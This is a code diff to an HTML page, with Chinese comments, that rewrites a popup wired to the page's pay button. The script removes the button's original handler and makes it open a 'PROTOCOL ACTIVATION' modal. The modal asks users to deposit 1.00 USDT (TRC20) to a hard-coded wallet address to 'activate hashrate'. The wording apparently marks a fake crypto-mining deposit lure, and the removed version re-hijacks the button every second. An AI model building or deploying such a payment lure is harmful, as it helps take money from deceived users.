@@ -3280,102 +3280,37 @@ document.getElementById('payBtn').onclick = handlePayment;
         renderCollection();
         updateDisplay();
     </script>
-    <style>
-    /* 强行覆盖：确保弹窗永远在最前面 */
-    #genesisModalOverlay {
-        display: none; 
-        position: fixed; 
-        z-index: 999999 !important; 
-        left: 0; top: 0; width: 100%; height: 100%; 
-        background: rgba(0,0,0,0.95); 
-        align-items: center; justify-content: center;
-        backdrop-filter: blur(10px);
-    }
-    .genesis-card {
-        background: #000; 
-        border: 2px solid #00ff41; 
-        padding: 25px; 
-        width: 85%; max-width: 380px; 
-        border-radius: 10px; 
-        box-shadow: 0 0 25px rgba(0,255,65,0.4);
-        color: #00ff41; 
-        font-family: 'Courier New', monospace;
-        position: relative;
-    }
-    .genesis-close {
-        position: absolute; right: 15px; top: 10px; 
-        font-size: 24px; cursor: pointer; color: #00ff41;
-    }
-    .genesis-addr-box {
-        background: rgba(0,255,65,0.1); 
-        border: 1px dashed #00ff41;
-        padding: 12px; margin: 20px 0; 
-        font-size: 13px; word-break: break-all; text-align: center;
-    }
-    .genesis-btn {
-        width: 100%; background: #00ff41; color: #000; 
-        border: none; padding: 15px; font-weight: bold; 
-        cursor: pointer; font-size: 16px; border-radius: 4px;
-    }
-</style>
-
-<div id="genesisModalOverlay">
-    <div class="genesis-card">
-        <span class="genesis-close" onclick="closePayModal()">&times;</span>
-        <h3 style="margin-top:0; letter-spacing:1px;">PROTOCOL ACTIVATION</h3>
-        <p style="font-size: 13px; line-height: 1.5; color: #ccc;">
-            Deposit 1.00 USDT (TRC20) to the secure vault address below to initiate hashrate:
-        </p>
-        <div class="genesis-addr-box" id="rawAddress">TRiNCMEiH8ev31PbgN9ZCUkw48yfQf8boW</div>
-        <button class="genesis-btn" onclick="doCopyAddress()">COPY VAULT ADDRESS</button>
-        <p style="font-size: 10px; color: #666; text-align: center; margin-top: 15px;">
-            * STATUS: AWAITING NETWORK CONFIRMATION<br>
-            * MANUAL VERIFICATION REQUIRED
-        </p>
+<div id="genesisModalOverlay" style="display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); align-items: center; justify-content: center;">
+    <div class="genesis-card" style="background: #000; border: 2px solid #00ff41; padding: 25px; width: 85%; max-width: 380px; border-radius: 10px; color: #00ff41; position: relative;">
+        <span class="genesis-close" onclick="closePayModal()" style="position: absolute; right: 15px; top: 10px; font-size: 24px; cursor: pointer;">&times;</span>
+        <h3 style="margin-top:0;">PROTOCOL ACTIVATION</h3>
+        <p style="font-size: 13px; color: #ccc;">Deposit 1.00 USDT (TRC20) to activate hashrate:</p>
+        <div id="rawAddress" style="background: rgba(0,255,65,0.1); border: 1px dashed #00ff41; padding: 12px; margin: 20px 0; font-size: 13px; word-break: break-all; text-align: center;">TRiNCMEiH8ev31PbgN9ZCUkw48yfQf8boW</div>
+        <button class="genesis-btn" onclick="doCopyAddress()" style="width: 100%; background: #00ff41; color: #000; border: none; padding: 15px; font-weight: bold; cursor: pointer;">COPY VAULT ADDRESS</button>
     </div>
 </div>
 
-   <script>
-    // 1. 关闭逻辑
+<script>
+    // 强制绑定点击功能
+    function openPayModal() {
+        document.getElementById('genesisModalOverlay').style.display = 'flex';
+    }
     function closePayModal() {
         document.getElementById('genesisModalOverlay').style.display = 'none';
     }
-
-    // 2. 复制逻辑（最稳妥的兼容写法）
     function doCopyAddress() {
         var addr = document.getElementById('rawAddress').innerText;
-        var input = document.createElement('textarea');
-        input.value = addr;
-        document.body.appendChild(input);
-        input.select();
-        document.execCommand('copy');
-        document.body.removeChild(input);
-        alert("VAULT ADDRESS COPIED!\nTransfer 1.00 USDT to activate.");
+        navigator.clipboard.writeText(addr).then(() => {
+            alert("VAULT ADDRESS COPIED!");
+        });
     }
 
-    // 3. 核心：暴力挂载点击事件
-    function initPaySystem() {
-        // 尝试抓取所有可能的支付按钮
-        const targetBtn = document.getElementById('payBtn') || 
-                          document.querySelector('.pay-to-win') || 
-                          document.querySelector('[onclick*="payToWin"]');
-        
-        if (targetBtn) {
-            // 清除原本可能冲突的点击属性
-            targetBtn.removeAttribute('onclick');
-            // 绑定新弹窗
-            targetBtn.onclick = function(e) {
-                e.preventDefault();
-                document.getElementById('genesisModalOverlay').style.display = 'flex';
-                return false;
-            };
-            console.log("Pay system online.");
-        }
+    // 自动寻找按钮并通电
+    window.onload = function() {
+        const btn = document.getElementById('payBtn') || document.querySelector('.pay-to-win');
+        if(btn) btn.onclick = openPayModal;
     }
+</script>
 
-    // 网页加载完和每隔1秒都检查一次按钮（防止某些框架动态刷新掉按钮）
-    window.addEventListener('load', initPaySystem);
-    setInterval(initPaySystem, 1000); 
-   </script>
 </body>
 </html>
